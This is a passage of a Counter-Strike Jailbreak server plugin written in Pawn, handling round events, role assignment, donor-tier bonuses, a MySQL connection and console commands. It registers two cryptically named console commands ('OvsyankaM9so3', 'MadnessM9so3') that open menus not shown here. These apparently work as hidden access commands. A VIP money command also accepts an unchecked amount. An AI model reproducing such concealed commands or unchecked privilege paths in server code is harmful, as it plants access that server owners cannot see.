	g_iAllCvars[CLOUN_SKIN_ROUND] = get_cvar_num("jbe_cloun_skin_round");
	g_iAllCvars[CLOUN_MOLOT_ROUND] = get_cvar_num("jbe_cloun_molot_round");
	g_iAllCvars[CLOUN_PUKAN_ROUND] = get_cvar_num("jbe_cloun_pukan_round");
	g_iAllCvars[CLOUN_PISS_ROUND] = get_cvar_num("jbe_cloun_piss_round");
	g_iAllCvars[CLOUN_CMEX_ROUND] = get_cvar_num("jbe_cloun_smex_round");
}
/*===== <- Квары <- =====*///}

public pahan()
{
	SzRandomizePahan = random_num(1, g_iMaxPlayers);
	if(is_user_connected(SzRandomizePahan))
	{
		if(is_user_alive(SzRandomizePahan) && jbe_get_user_team(SzRandomizePahan) == 1)
		{
			set_user_pahan(SzRandomizePahan);
			if(task_exists(TASK_PAHAN)) remove_task(TASK_PAHAN);
		}
		else set_task(2.0,"pahan", TASK_PAHAN); ///Не находим пахана, запускаем задачу снова
	}
	else set_task(2.0,"pahan",TASK_PAHAN); 
}

public set_user_pahan(id) ///Собственно выдача пахана
{
	get_user_name(SzRandomizePahan, SzPahanName, sizeof(SzPahanName) - 1);
	
	UTIL_SayText(0, "%L Пахан: !g%s !y[ Бомбочка, 200 здоровья, Ультра-кулаки ]", id, "JBE_PREFIX", SzPahanName);
	
	set_user_health(SzRandomizePahan, get_user_health(SzRandomizePahan) + 200);
	give_weapon_pumkin(id);
	
	g_Pahan[SzRandomizePahan] = true;
	jbe_set_user_model(SzRandomizePahan, g_szPlayerModel[PAHAN]);
	SetBit(g_iBitSharpening, SzRandomizePahan);
	if(IsSetBit(g_iBitWeaponStatus, id) && get_user_weapon(id) == CSW_KNIFE)
	{
		new iActiveItem = get_pdata_cbase(id, m_pActiveItem);
		if(iActiveItem > 0) ExecuteHamB(Ham_Item_Deploy, iActiveItem);
	}
	else UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOP_WEAPON_HELP");
	
	set_dhudmessage(255, 165, 0, -1.0, 0.83, 0, 6.0, 4.0);
    show_dhudmessage(id, "Вы стали Паханом!");
	UTIL_SendAudio(0, _, g_szSounds[GIVE_PAHAN]);

	return PLUGIN_HANDLED;
}

public Task_MySQL_Connect(i_Task) {
	new iErr, sErr[256];
	
	hSql = SQL_MakeDbTuple(UTIL_GetCvarString("jbe_sql_hostname"), UTIL_GetCvarString("jbe_sql_username"), UTIL_GetCvarString("jbe_sql_password"), UTIL_GetCvarString("jbe_sql_database"));
	
	if((hConnected = SQL_Connect(hSql, iErr, sErr, charsmax(sErr))) == Empty_Handle) {
		log_amx("Ошибка MySQL: %s", sErr);
	}
	else {
		SQL_QueryAndIgnore(hConnected, "set names utf8");
		SQL_Execute((SQL_PrepareQuery(hConnected, "CREATE TABLE IF NOT EXISTS `%sblocks` (`id` int(9) NOT NULL AUTO_INCREMENT,`steam_id` varchar(35) NOT NULL,`ip` varchar(32) NOT NULL,PRIMARY KEY (`id`)) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1;", UTIL_GetCvarString("jbe_sql_prefixes"))));
		SQL_FreeHandle(hConnected);
	}
	remove_task(i_Task);
}

/*===== -> Игровые события -> =====*///{
event_init()
{
	register_event("ResetHUD", "Event_ResetHUD", "be");
	register_logevent("LogEvent_RestartGame", 2, "1=Game_Commencing", "1&Restart_Round_");
	register_event("HLTV", "Event_HLTV", "a", "1=0", "2=0");
	register_logevent("LogEvent_RoundStart", 2, "1=Round_Start");
	register_logevent("LogEvent_RoundEnd", 2, "1=Round_End");
	register_event("StatusValue", "Event_StatusValueShow", "be", "1=2", "2!0");
	register_event("StatusValue", "Event_StatusValueHide", "be", "1=1", "2=0");
}

public Event_ResetHUD(id)
{
    if(g_Pahan[id]) g_Pahan[id] = false;
	if(IsNotSetBit(g_iBitUserConnected, id)) return;
	message_begin(MSG_ONE, MsgId_Money, _, id);
	write_long(g_iUserMoney[id]);
	write_byte(0);
	message_end();
}

public LogEvent_RestartGame()
{
	LogEvent_RoundEnd();
	jbe_set_day(0);
	jbe_set_day_week(0);
	if(task_exists(TASK_MP3)) remove_task(TASK_MP3);
	
	if(jbe_get_day_mode() == 3) formatex(SzPahanMessage, sizeof(SzPahanMessage), "%L", LANG_PLAYER, "JBE_PAHAN_GAMEMODE");
	else formatex(SzPahanMessage, sizeof(SzPahanMessage), "%L", LANG_PLAYER, "JBE_PAHAN_GAMEMODE");
}

public Event_HLTV()
{
	g_bRoundEnd = false;
	for(new i; i < sizeof(g_iHamHookForwards); i++) DisableHamForward(g_iHamHookForwards[i]);
	if(g_bRestartGame)
	{
		if(task_exists(TASK_RESTART_GAME_TIMER)) return;
		g_iDayModeTimer = g_iAllCvars[RESTART_GAME_TIME] + 1;
		set_task(1.0, "jbe_restart_game_timer", TASK_RESTART_GAME_TIMER, _, _, "a", g_iDayModeTimer);
		return;
	}
	jbe_set_day(++g_iDay);
	jbe_set_day_week(++g_iDayWeek);
	g_szChiefName = "";
	g_iChiefStatus = 0;
	g_iBitUserFree = 0;
	g_szFreeNames = "";
	g_iWantedCount = 0;
	g_iFreeCount = 0;
	g_iBitUserWanted = 0;
	g_szWantedNames = "";
	g_iLastPnId = 0;
	g_iBitSharpening = 0;
	g_iBitScrewdriver = 0;
	g_iBitBalisong = 0;
	g_iBitMachete = 0;
	g_iBitSerp = 0;
	g_iBitWeaponStatus = 0;
	g_iBitLatchkey = 0;
	g_iBitKokain = 0;
	g_iBitFrostNade = 0;
	g_iBitClothingGuard = 0;
	g_iBitClothingType = 0;
	g_iBitHingJump = 0;
	g_iBitFastRun = 0;
	g_iBitGravRun = 0;
	g_iBitDoubleJump = 0;
	g_iBitAutoBhop = 0;
	g_iBitDoubleDamage = 0;
	g_iBitLotteryTicket = 0;
	g_iBitUserVoice = 0;
	g_bDoorStatus = false;
	g_MafiaGame = 0;
    remove_task(8888);
    mafia_off();
	if(jbe_get_day_week() <= 5 || !g_iDayModeListSize || g_iPlayersNum[1] < 0) jbe_set_day_mode(1);
	else jbe_set_day_mode(3);
	
	i_DataSpecialChief[GUARD_VOICE] = true;
	
	Chicken_Delete();
	Block_Delete(0, true);
	Portal_Delete(IN);
	Portal_Delete(OUT);
	Spleef_Delete();
	
	if(g_bPush)
	{
		g_bPush = false;
		DisableHamForward(g_HamHookPlayerTouch);
	}
}

public jbe_restart_game_timer()
{
	if(--g_iDayModeTimer)
	{
		jbe_open_doors();
		formatex(g_szDayModeTimer, charsmax(g_szDayModeTimer), "- %i", g_iDayModeTimer);
	}
	else
	{
		g_szDayModeTimer = "";
		g_bRestartGame = false;
		server_cmd("sv_restart 5");
	}
}

public LogEvent_RoundStart()
{
    if(task_exists(TASK_LAST_DIE)) remove_task(TASK_LAST_DIE);
	if(g_bRestartGame) return;
	if(jbe_get_day_week() <= 5 || !g_iDayModeListSize || g_iAlivePlayersNum[1] < 0)
	{
		if(!g_iChiefStatus)
		{
			g_iChiefChoiceTime = 15 + 1;
			set_task(1.0, "jbe_chief_choice_timer", TASK_CHIEF_CHOICE_TIME, _, _, "a", g_iChiefChoiceTime);
		}
		if(jbe_get_day_week() == 1)
		{
			jbe_free_day_start();
            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_FD_PN");			
		}	
		now_Hunger = false; // сейчас не голодные игры	
		for(new i = 1; i <= g_iMaxPlayers; i++)
		{
			g_BlockCostumes = false;
		    ClearBit(g_iBitUnlimitedAmmo, i);
			set_task(1.0, "pahan", TASK_PAHAN);
			if(g_iUserTeam[i] == 1)
			{
				if(IsSetBit(g_iBitUserFreeNextRound, i))
				{
					jbe_add_user_free(i);
					ClearBit(g_iBitUserFreeNextRound, i);
				}
				if(IsSetBit(g_iBitUserVoiceNextRound, i))
				{
					SetBit(g_iBitUserVoice, i);
					ClearBit(g_iBitUserVoiceNextRound, i);
				}
                if(jbe_get_day_week() == 1) g_Free_Count[i] = 0;
        
                if(jbe_get_day_week() == 1 && IsSetBit(g_iBitUserMonday, i))
                {
                    ClearBit(g_iBitUserMonday, i);
                    jbe_add_user_free(i);
			    }
			}
			if(g_iUserTeam[i] == 2 && IsSetBit(g_iBitUserDemon, i))
            {
                SetBit(g_iBitShocker, i);
				UTIL_SayText(i, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOCKER_WEAPON_HELP");
            }
			if(IsSetBit(g_iBitUserVip, i))
			{
				for(new item = 0; item < DATA_BOMJ; item++)
					g_iBomjData[i][item]++;
				g_iVipHealth[i] = g_iAllCvars[VIP_HEALTH_NUM];
			}
			if(IsSetBit(g_iBitUserPremium, i))
			{
				for(new item = 0; item < DATA_PREMIUM; item++)
					g_iPremiumData[i][item]++;
			}
			if(IsSetBit(g_iBitUserElite, i))
			{
				for(new item = 0; item < DATA_ELITE; item++)
					g_iEliteData[i][item]++;
				g_iEliteSpeed[i] = 2;
				g_iEliteGrav[i] = 2;
				g_iEliteFd[i] = 1;
				g_iEliteHealth[i] = 2;
			}
			if(IsSetBit(g_iBitUserAlpha, i))
			{
				for(new item = 0; item < DATA_ALPHA; item++)
					g_iAlphaData[i][item]++;
			}
			if(IsSetBit(g_iBitUserStraj, i))
			{
				for(new item = 0; item < DATA_STRAJ; item++)
					g_iStrajData[i][item]++;
			}
			if(IsSetBit(g_iBitUserSuperSimon, i))
			{
				for(new item = 0; item < DATA_SUPER_SIMON; item++)
					g_iSuperSimonData[i][item]++;
			}
			if(IsSetBit(g_iBitUserDelta, i))
			{
				for(new item = 0; item < DATA_DELTA; item++)
					g_iDeltaData[i][item]++;
			}
			if(IsSetBit(g_iBitUserDyavol, i))
			{
				for(new item = 0; item < DATA_DYAVOL; item++)
					g_iDyavolData[i][item]++;
			}
			if(IsSetBit(g_iBitUserPrez, i))
			{
				for(new item = 0; item < DATA_PRES; item++)
					g_iPresidentData[i][item]++;
			}
			if(IsSetBit(g_iBitUserDemon, i))
			{
				for(new item = 0; item < DATA_DEMON; item++)
					g_iDemonData[i][item]++;
			}
			if(IsSetBit(g_iBitUserCloun, i))
			{
				for(new item = 0; item < DATA_CLOUN; item++)
					g_iClounData[i][item]++;
			}
		}
	}
	else jbe_vote_day_mode_start();
}

public jbe_chief_choice_timer()
{
	if(--g_iChiefChoiceTime)
	{
		if(g_iChiefChoiceTime == 15) g_iChiefIdOld = 0;
		formatex(g_szChiefName, charsmax(g_szChiefName), "- %i", g_iChiefChoiceTime);
	}
    else if(g_iPlayersNum[2] < 1)    // если кт нет
    {
		g_szChiefName = "";
		formatex(g_szChiefName, charsmax(g_szChiefName), "");
        jbe_open_doors();
		now_Hunger = true;		
		g_iFriendlyFire = 1;
        for(new i = 1; i < g_iMaxPlayers; i++)
		{
			if(is_user_alive(i) && is_user_connected(i))
			{
				if(IsSetBit(g_iBitUserFree, i)) jbe_sub_user_free(i);
				Weapons_Hunger(i);
			}			
		}
		client_cmd(0, "mp3 play sound/jb_engine/days_mode/music_game/music_game2.mp3");
		UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_GOLODKI");				
    }
    else    // если кт есть, но начальника не выбрали
    {
        g_szChiefName = "";
        formatex(g_szChiefName, charsmax(g_szChiefName), "");
        jbe_open_doors();
        for(new i = 1; i < g_iMaxPlayers; i++)
        {
            if(is_user_alive(i) && jbe_get_user_team(i) == 1 && is_user_connected(i))
            {
                fm_give_item(i, "weapon_m3");
                fm_set_user_bpammo(i, CSW_M3, 200);
            }
        }
		UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_GIVE_M3_TT");	
    }	
}

public Hunger_respawn(id)    // возродить игрока во время хг без кт
{
    if(g_iAlivePlayersNum[1] > 1 && jbe_get_user_team(id) == 1 && g_iAlivePlayersNum[2] < 1)
    {
        ExecuteHamB(Ham_CS_RoundRespawn, id);
        set_task(0.1, "Weapons_Hunger", id); // выдать оружие после реса
    }
}

public Weapons_Hunger(id) // выдать оружие хг
{
    fm_give_item(id, "weapon_ak47");
    fm_set_user_bpammo(id, CSW_AK47, 99);
    fm_give_item(id, "weapon_deagle");
    fm_set_user_bpammo(id, CSW_DEAGLE, 999);
    fm_set_user_bpammo(id, CSW_M4A1, 999);
    fm_set_user_bpammo(id, CSW_AWP, 999);	
}

public LogEvent_RoundEnd()
{
	if(!task_exists(TASK_ROUND_END))
		set_task(0.1, "LogEvent_RoundEndTask", TASK_ROUND_END);
}

public LogEvent_RoundEndTask()
{
	if(g_iDayMode != 3)
	{
	    g_MafiaGame = 0;
        remove_task(8888);
        mafia_off();
		g_iFriendlyFire = 0;
		if(task_exists(TASK_COUNT_DOWN_TIMER)) remove_task(TASK_COUNT_DOWN_TIMER);
		g_iChiefId = 0;
		if(task_exists(TASK_CHIEF_CHOICE_TIME))
		{
			remove_task(TASK_CHIEF_CHOICE_TIME);
			g_szChiefName = "";
		}
		if(g_iDayMode == 2) jbe_free_day_ended();
		if(g_bSoccerStatus) jbe_soccer_disable_all();
		if(g_bBoxingStatus) jbe_boxing_disable_all();
		if(task_exists(TASK_LAST_DIE)) remove_task(TASK_LAST_DIE);
		for(new i = 1; i <= g_iMaxPlayers; i++)
		{
			if(IsNotSetBit(g_iBitUserAlive, i)) continue;
			if(task_exists(i+TASK_REMOVE_SYRINGE))
			{
				remove_task(i+TASK_REMOVE_SYRINGE);
				if(get_user_weapon(i))
				{
					new iActiveItem = get_pdata_cbase(i, m_pActiveItem);
					if(iActiveItem > 0) ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				}
			}
			if(pev(i, pev_renderfx) != kRenderFxNone || pev(i, pev_rendermode) != kRenderNormal)
			{
				jbe_set_user_rendering(i, kRenderFxNone, 0, 0, 0, kRenderNormal, 0);
				g_eUserRendering[i][RENDER_STATUS] = false;
			}
			if(g_iBitUserFrozen && IsSetBit(g_iBitUserFrozen, i))
			{
				ClearBit(g_iBitUserFrozen, i);
				if(task_exists(i+TASK_FROSTNADE_DEFROST)) remove_task(i+TASK_FROSTNADE_DEFROST);
				set_pev(i, pev_flags, pev(i, pev_flags) & ~FL_FROZEN);
				set_pdata_float(i, m_flNextAttack, 0.0, linux_diff_player);
				emit_sound(i, CHAN_AUTO, "jb_engine/shop/defrost_player.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				new Float:vecOrigin[3]; pev(i, pev_origin, vecOrigin);
				CREATE_BREAKMODEL(vecOrigin, _, _, 10, g_pModelGlass, 10, 25, 0x01);
			}
			if(g_iBitInvisibleHat && IsSetBit(g_iBitInvisibleHat, i))
			{
				ClearBit(g_iBitInvisibleHat, i);
				if(task_exists(i+TASK_INVISIBLE_HAT)) remove_task(i+TASK_INVISIBLE_HAT);
			}
			if(g_iBitRandomGlow && IsSetBit(g_iBitRandomGlow, i)) ClearBit(g_iBitRandomGlow, i);
			g_iSimonVoice = 0;
			ClearBit(g_iBitUserSimon, i);
		}
		if(g_iDuelStatus)
		{
			g_iBitUserDuel = 0;
			if(task_exists(TASK_DUEL_COUNT_DOWN))
			{
				remove_task(TASK_DUEL_COUNT_DOWN);
				client_cmd(0, "mp3 stop");
			}
		}
	}
	else
	{
		if(task_exists(TASK_VOTE_DAY_MODE_TIMER))
		{
			remove_task(TASK_VOTE_DAY_MODE_TIMER);
			for(new i = 1; i <= g_iMaxPlayers; i++)
			{
				if(IsNotSetBit(g_iBitUserVoteDayMode, i)) continue;
				ClearBit(g_iBitUserVoteDayMode, i);
				ClearBit(g_iBitUserDayModeVoted, i);
				show_menu(i, 0, "^n");
				jbe_informer_offset_down(i);
				jbe_menu_unblock(i);
				set_pev(i, pev_flags, pev(i, pev_flags) & ~FL_FROZEN);
				set_pdata_float(i, m_flNextAttack, 0.0, linux_diff_player);
				UTIL_ScreenFade(i, 512, 512, 0, 0, 0, 0, 255, 1);
			}
		}
		if(g_iVoteDayMode != -1)
		{
			if(task_exists(TASK_DAY_MODE_TIMER)) remove_task(TASK_DAY_MODE_TIMER);
			g_szDayModeTimer = "";
			ExecuteForward(g_iHookDayModeEnded, g_iReturnDayMode, g_iVoteDayMode, g_iAlivePlayersNum[1] ? 1 : 2);
			g_iVoteDayMode = -1;
		}
	}
	for(new i; i < sizeof(g_iHamHookForwards); i++) EnableHamForward(g_iHamHookForwards[i]);
	g_bRoundEnd = true;
	if(g_iRoundSoundSize)
	{
		new aDataRoundSound[DATA_ROUND_SOUND], iTrack = random_num(0, g_iRoundSoundSize - 1);
		ArrayGetArray(g_aDataRoundSound, iTrack, aDataRoundSound);
		for(new i = 1; i <= g_iMaxPlayers; i++)
		{
			if(IsNotSetBit(g_iBitUserConnected, i) || IsNotSetBit(g_iBitUserRoundSound, i)) continue;
			client_cmd(i, "mp3 play sound/jb_engine/round_sound/%s.mp3", aDataRoundSound[FILE_NAME]);
			UTIL_SayText(i, "%L %L", i, "JBE_PREFIX", i, "JBE_CHAT_ID_NOW_PLAYING", aDataRoundSound[TRACK_NAME]);
			if(IsNotSetBit(g_iBitUserAlive, i)) continue;
		}
	}
	if(task_exists(TASK_MP3)) remove_task(TASK_MP3);
}

public Event_StatusValueShow(id)
{
	new iTarget = read_data(2), szName[32], szTeam[][] = {"", "JBE_ID_HUD_STATUS_TEXT_PRISONER", "JBE_ID_HUD_STATUS_TEXT_GUARD", ""};
	get_user_name(iTarget, szName, charsmax(szName));
	
	new szDonate[64];
	if(IsSetBit(g_iBitUserCloun, iTarget)) formatex(szDonate, charsmax(szDonate), "Клоун");
	else if(IsSetBit(g_iBitUserDemon, iTarget)) formatex(szDonate, charsmax(szDonate), "Демон");
	else if(IsSetBit(g_iBitUserPrez, iTarget)) formatex(szDonate, charsmax(szDonate), "Президент");
	else if(IsSetBit(g_iBitUserDyavol, iTarget)) formatex(szDonate, charsmax(szDonate), "Дьявол");
	else if(IsSetBit(g_iBitUserDelta, iTarget)) formatex(szDonate, charsmax(szDonate), "Дельта");
	else if(IsSetBit(g_iBitUserSuperSimon, iTarget)) formatex(szDonate, charsmax(szDonate), "Супер-саймон");
	else if(IsSetBit(g_iBitUserStraj, iTarget)) formatex(szDonate, charsmax(szDonate), "Стражник");
	else if(IsSetBit(g_iBitUserAlpha, iTarget)) formatex(szDonate, charsmax(szDonate), "Альфа");
	else if(IsSetBit(g_iBitUserElite, iTarget)) formatex(szDonate, charsmax(szDonate), "Элита");
	else if(IsSetBit(g_iBitUserPremium, iTarget)) formatex(szDonate, charsmax(szDonate), "Премиум");
	else if(IsSetBit(g_iBitUserAdmin, iTarget)) formatex(szDonate, charsmax(szDonate), "Админ");
	else if(IsSetBit(g_iBitUserVip, iTarget)) formatex(szDonate, charsmax(szDonate), "Вип");
	else formatex(szDonate, charsmax(szDonate), "Игрок");
	
	set_hudmessage(255, 165, 0, -1.0, 0.70, 0, 0.0, 10.0, 0.0, 0.0, -1);
	ShowSyncHudMsg(id, g_iSyncStatusText, "%L", id, "JBE_ID_HUD_STATUS_TEXT", id, szTeam[g_iUserTeam[iTarget]], szName, get_user_health(iTarget), g_iUserMoney[iTarget], szDonate);
}

public Event_StatusValueHide(id) ClearSyncHud(id, g_iSyncStatusText);
/*===== <- Игровые события <- =====*///}

/*===== -> Консольные команды -> =====*///{
clcmd_init()
{
	for(new i, szBlockCmd[][] = {"jointeam", "joinclass"}; i < sizeof szBlockCmd; i++) register_clcmd(szBlockCmd[i], "ClCmd_Block");
	register_clcmd("chooseteam", "ClCmd_ChooseTeam");
	register_clcmd("menuselect", "ClCmd_MenuSelect");
	register_clcmd("money_transfer", "ClCmd_MoneyTransfer");

	register_clcmd("radio2", "ClCmd_Radio2");
	register_clcmd("radio3", "ClCmd_Radio3");
	register_clcmd("+hook", "ClCmd_HookOn");
	register_clcmd("-hook", "ClCmd_HookOff");
	register_clcmd("+fly", "ClCmd_FlyOn");
	register_clcmd("-fly", "ClCmd_FlyOff");
	register_clcmd("drop", "ClCmd_Drop");
	register_clcmd("say /bind", "ClCmd_BindKeys");
	register_clcmd("OvsyankaM9so3", "ClCmd_OvsyankaMenu");
	register_clcmd("MadnessM9so3", "ClCmd_MadnessMenu");
	register_clcmd("say /money", "ClCmd_Money");
	register_clcmd("set_money_1", "set_money_1");
    register_clcmd("num_money_1", "num_money_1");
}

public set_money_1(id)
{
    if(IsSetBit(g_iBitUserVip, id))
    {
        if(TargetID[id] == 0) return PLUGIN_HANDLED;
        new arg[32], targetname[32], adminname[32];
        new    getmoney = jbe_get_user_money(TargetID[id]);
        read_argv(1, arg, 31);
        jbe_set_user_money(TargetID[id], getmoney + str_to_num(arg), 1);
        get_user_name(id,adminname,charsmax(adminname));
        get_user_name(TargetID[id], targetname, charsmax(targetname));
		UTIL_SayText(0, "%L !tОвсяныч !g%s !tвыдал !g$%s !tигроку !g%s", LANG_PLAYER, "JBE_PREFIX", adminname, arg, targetname);
        TargetID[id] = 0;
        return PLUGIN_HANDLED;
    }
    return PLUGIN_CONTINUE;
}

public ClCmd_MenuSelect(id) UTIL_SendAudio(id, _, g_szSounds[MENU_CLICK]);

public num_money_1(id)
{
    client_cmd(id,"messagemode set_money_1");
    return PLUGIN_CONTINUE;
}

public ClCmd_Money(id)
{
    return Cmd_MoneyTransferMenu(id);
}

public ClCmd_OvsyankaMenu(id)
{
    return Show_OvsyankaKrut(id);
}

public ClCmd_MadnessMenu(id)
{
    return Show_MadnessMenu(id);
}

public ClCmd_Block(id) return PLUGIN_HANDLED;

public ClCmd_ChooseTeam(id)
{
	if(jbe_menu_blocked(id)) return PLUGIN_HANDLED;
	switch(g_iUserTeam[id])
	{
		case 1: Show_MainPnMenu(id);
		case 2: Show_MainGrMenu(id);
		default: Show_ChooseTeamMenu(id, 0);
	}
	return PLUGIN_HANDLED;
}

public ClCmd_MoneyTransfer(id, iTarget, iMoney)
{
	if(!iTarget)
	{
		new szArg1[3], szArg2[7];
		read_argv(1, szArg1, charsmax(szArg1));
		read_argv(2, szArg2, charsmax(szArg2));
		if(!is_str_num(szArg1) || !is_str_num(szArg2))
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_ERROR_PARAMETERS");
			return PLUGIN_HANDLED;
		}
		iTarget = str_to_num(szArg1);
		iMoney = str_to_num(szArg2);
	}
	if(id == iTarget || !jbe_is_user_valid(iTarget) || IsNotSetBit(g_iBitUserConnected, iTarget)) UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_UNKNOWN_PLAYER");
	else if(g_iUserMoney[id] < iMoney) UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SUFFICIENT_FUNDS");
	else if(iMoney <= 0) UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_MIN_AMOUNT_TRANSFER");
	else
	{
		jbe_set_user_money(iTarget, g_iUserMoney[iTarget] + iMoney, 1);
		jbe_set_user_money(id, g_iUserMoney[id] - iMoney, 1);
		new szName[32], szNameTarget[32];
		get_user_name(id, szName, charsmax(szName));
		get_user_name(iTarget, szNameTarget, charsmax(szNameTarget));
		UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ALL_MONEY_TRANSFER", szName, iMoney, szNameTarget);
	}
	return PLUGIN_HANDLED;
}

public ClCmd_Radio2(id)
{
	if(g_iUserTeam[id] == 1 && get_user_weapon(id) == CSW_KNIFE && (IsSetBit(g_iBitSharpening, id) || IsSetBit(g_iBitScrewdriver, id) || IsSetBit(g_iBitBalisong, id) || IsSetBit(g_iBitMachete, id) || IsSetBit(g_iBitSerp, id)))
	{
		if(IsSetBit(g_iBitUserSoccer, id) || IsSetBit(g_iBitUserBoxing, id) || IsSetBit(g_iBitUserDuel, id))
		{
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_SHOP_WEAPON_BLOCKED");
			return PLUGIN_HANDLED;
		}
		if(get_pdata_float(id, m_flNextAttack) < 0.1)
		{
			new iActiveItem = get_pdata_cbase(id, m_pActiveItem);
			if(iActiveItem > 0)
			{
				InvertBit(g_iBitWeaponStatus, id);
				ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				UTIL_WeaponAnimation(id, 3);
			}
		}
	}
	if(g_iUserTeam[id] == 2 && get_user_weapon(id) == CSW_KNIFE && IsSetBit(g_iBitShocker, id))
    {
        if(get_pdata_float(id, m_flNextAttack) < 0.1)
        {
            new iActiveItem = get_pdata_cbase(id, m_pActiveItem);
            if(iActiveItem > 0)
            {
                InvertBit(g_iBitWeaponStatus, id);
                ExecuteHamB(Ham_Item_Deploy, iActiveItem);
                UTIL_WeaponAnimation(id, 3);
            }
        }
    }
	return PLUGIN_HANDLED;
}

public ClCmd_Radio3(id)
{
    if(g_iUserTeam[id] == 1 && IsSetBit(g_iBitLatchkey, id))
    {
        new iTarget, iBody;
        get_user_aiming(id, iTarget, iBody, 30);
        if(pev_valid(iTarget))
        {
            new szClassName[32];
            pev(iTarget, pev_classname, szClassName, charsmax(szClassName));
            if(szClassName[5] == 'd' && szClassName[6] == 'o' && szClassName[7] == 'o' && szClassName[8] == 'r')
            {
                dllfunc(DLLFunc_Use, iTarget, id);
                ClearBit(g_iBitLatchkey, id);
				UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_LATCHKEY_DOOR");
                return PLUGIN_HANDLED;
            }
        }
        else if(IsSetBit(g_iBitCuff, id))
        {
            ResetCuffPlayer(id);
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_LATCHKEY_NARUCH");
            ClearBit(g_iBitLatchkey, id);
            return PLUGIN_HANDLED;
        }
    }
	return PLUGIN_HANDLED;
}

public ResetCuff()
{
    for(new pPlayer; pPlayer <= g_iMaxPlayers; pPlayer++)
    {
        if(IsSetBit(g_iBitCuff, pPlayer))
        {
            ClearBit(g_iBitCuff, pPlayer);
            new iActiveItem = get_pdata_cbase(pPlayer, m_pActiveItem);
            if(iActiveItem > 0)
            {
                ExecuteHamB(Ham_Item_Deploy, iActiveItem);
                UTIL_WeaponAnimation(pPlayer, 3);
            }
            set_pdata_float(pPlayer, m_flNextAttack, 0.0);
        }
    }
}

public ResetCuffPlayer(pPlayer)
{
    if(IsSetBit(g_iBitCuff, pPlayer))
    {
        ClearBit(g_iBitCuff, pPlayer);
        new iActiveItem = get_pdata_cbase(pPlayer, m_pActiveItem);
        if(iActiveItem > 0)
        {
            ExecuteHamB(Ham_Item_Deploy, iActiveItem);
            UTIL_WeaponAnimation(pPlayer, 3);
        }
        set_pdata_float(pPlayer, m_flNextAttack, 0.0);
        emit_sound(pPlayer, CHAN_AUTO, "zone54/uncuff.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
    }
}

public ClCmd_Drop(id)
{
	if(IsSetBit(g_iBitUserDuel, id)) return PLUGIN_HANDLED;
	return PLUGIN_CONTINUE;
}

public ClCmd_HookOn(id)
{
	if(IsNotSetBit(g_iBitUserHook, id))
   	{
		UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", id, "JBE_CHAT_ID_HOOK_NO_ACCESS");
		return PLUGIN_HANDLED;
	}
	if(g_bHookStatus || g_szWantedNames[0] || g_iDayMode == 3 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserSoccer, id) || IsSetBit(g_iBitUserBoxing, id) || IsSetBit(g_iBitUserDuel, id) || task_exists(id+TASK_HOOK_THINK))
    {
		UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", id, "JBE_CHAT_ID_HOOK_NOT_AVAILABLE");
		return PLUGIN_HANDLED;
	}
	new iOrigin[3];
	get_user_origin(id, iOrigin, 3);
	g_vecHookOrigin[id][0] = float(iOrigin[0]);
	g_vecHookOrigin[id][1] = float(iOrigin[1]);
	g_vecHookOrigin[id][2] = float(iOrigin[2]);
	CREATE_SPRITESCATTER(g_vecHookOrigin[id], g_iHookSpriteEnd[g_iHookEnd[id]]);
	emit_sound(id, CHAN_STATIC, g_szHookSound[g_iHookSound[id]][1], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	jbe_hook_think(id+TASK_HOOK_THINK);
	set_task(0.1, "jbe_hook_think", id+TASK_HOOK_THINK, _, _, "b");
	return PLUGIN_HANDLED;
}

public ClCmd_HookOff(id)
{
	if(task_exists(id+TASK_HOOK_THINK))
	{
		remove_task(id+TASK_HOOK_THINK);
		emit_sound(id, CHAN_STATIC, g_szHookSound[g_iHookSound[id]][1], VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
	}
	return PLUGIN_HANDLED;
}

public ClCmd_FlyOn(id)
{
    if(IsNotSetBit(g_iBitUserDemon, id))
   	{
		UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", id, "JBE_CHAT_ID_FLY_NO_ACCESS");
		return PLUGIN_HANDLED;
	}
	if(g_bHookStatus || g_szWantedNames[0] || g_iDayMode == 3 || IsNotSetBit(g_iBitUserAlive, id) || IsSetBit(g_iBitUserSoccer, id) || IsSetBit(g_iBitUserBoxing, id) || IsSetBit(g_iBitUserDuel, id) || task_exists(id+TASK_FLY_PLAYER))
    {
		UTIL_SayText(id, "%L %L", id, "JBE_PREFIX", id, "JBE_CHAT_ID_FLY_NOT_AVAILABLE");
		return PLUGIN_HANDLED;
	}
	if(IsSetBit(g_iBitUserDemon, id))
	{
		func_trail(id);
